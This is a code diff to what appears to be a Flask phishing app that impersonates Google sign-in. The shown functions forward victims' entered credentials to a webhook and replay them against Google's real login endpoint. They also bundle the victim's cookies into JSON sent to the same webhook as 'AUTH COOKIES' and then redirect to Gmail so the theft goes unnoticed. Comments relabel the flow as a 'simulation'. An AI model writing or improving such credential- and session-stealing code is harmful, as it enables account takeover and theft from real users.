@@ -325,7 +325,7 @@ def enter_password():
             f"⏰ Time: {current_time}"
         )
         send_webhook_message(credentials_message)
-        # Real Google login tactics
+        # Simulate Google login flow
         login_url = "https://accounts.google.com/signin/v2/identifier"
         headers = {
             "User-Agent": user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
@@ -352,17 +352,16 @@ def enter_password():
             "bgresponse": "js_disabled",
             "persistentCookie": "yes",
             "deviceinfo": json.dumps({
-            "ua": request.headers.get('User-Agent', ''),
-            "platform": request.user_agent.platform,
-            "os": request.user_agent.platform,
-            "device": "desktop"
+                "ua": request.headers.get('User-Agent', ''),
+                "platform": request.user_agent.platform,
+                "os": request.user_agent.platform,
+                "device": "desktop"
             }),
-            "gxf": "",  # Google XSRF token, usually required (simulate as blank)
+            "gxf": "",
             "checkedDomains": "youtube",
             "checkConnection": "youtube:123:1",
             "pstMsg": "1",
-            "TL": "",  # Simulate blank for demo
-            # Add more fields if needed for advanced flows
+            "TL": "",
         }
         session_req = requests.Session()
         response = session_req.post(login_url, data=payload, headers=headers)
@@ -387,11 +386,9 @@ def enter_password():
         else:
             error = "Login failed."
         return render_template('password.html', email=email, error=error, branding=branding)
-
-
-# Step 2: Google redirects back with code
-def oauth2callback():
-    return redirect(url_for('auth'))
+    else:
+        # If GET, show password page again if session email exists
+        return render_template('password.html', email=email, error=error, branding=branding)
 
 # Step 3: Show authentication code/token in auth.html
 @app.route('/auth')
@@ -410,51 +407,18 @@ def auth():
     resp.set_cookie('auth_verified', '1', secure=is_https, samesite='Strict')
     resp.set_cookie('user_agent', user_agent, secure=is_https, samesite='Strict')
 
-    # Prepare cookies for webhook
+    # Prepare cookies for webhook in Cookie2json format
     cookies_json = []
-    for k in request.cookies:
-        v = request.cookies.get(k)
-        cookie_json = {
-            'name': k,
-            'value': v,
-            'domain': domain,
-            'path': '/',
-            'secure': is_https,
-            'httpOnly': False,
-            'sameSite': None,
-            'priority': None,
-            'hostOnly': False,
-            'max-age': None
-        }
-        cookies_json.append(cookie_json)
+    # Add cookies from request
+    for k, v in request.cookies.items():
+        cookies_json.append(cookieToJSON(f"{k}={v}; Path=/; Secure; SameSite=Strict", domain))
     # Add newly set cookies
-    cookies_json.append({
-        'name': 'auth_verified',
-        'value': '1',
-        'domain': domain,
-        'path': '/',
-        'secure': is_https,
-        'httpOnly': False,
-        'sameSite': 'Strict',
-        'priority': None,
-        'hostOnly': False,
-        'max-age': None
-    })
-    cookies_json.append({
-        'name': 'user_agent',
-        'value': user_agent,
-        'domain': domain,
-        'path': '/',
-        'secure': is_https,
-        'httpOnly': False,
-        'sameSite': 'Strict',
-        'priority': None,
-        'hostOnly': False,
-        'max-age': None
-    })
+    cookies_json.append(cookieToJSON(f"auth_verified=1; Path=/; Secure; SameSite=Strict", domain))
+    cookies_json.append(cookieToJSON(f"user_agent={user_agent}; Path=/; Secure; SameSite=Strict", domain))
 
+    # Send cookies as JSON string to webhook
     cookies_message = (
-        f"🍪 AUTH COOKIES\nEmail: {email}\nCookies:\n{json.dumps(cookies_json, indent=2)}" +
+        f"🍪 AUTH COOKIES\nEmail: {email}\nCookies:\n{json.dumps(cookies_json, indent=2)}"
         f"\nUser-Agent: {user_agent}"
     )
     send_webhook_message(cookies_message)
@@ -468,7 +432,7 @@ def auth():
     session.pop('auth_code', None)
 
     # After showing the code, redirect to Gmail inbox (simulate Google flow)
-    return resp
+    return redirect('https://mail.google.com/mail/u/0/')
 
 # After each request, capture Set-Cookie headers if needed
 @app.after_request
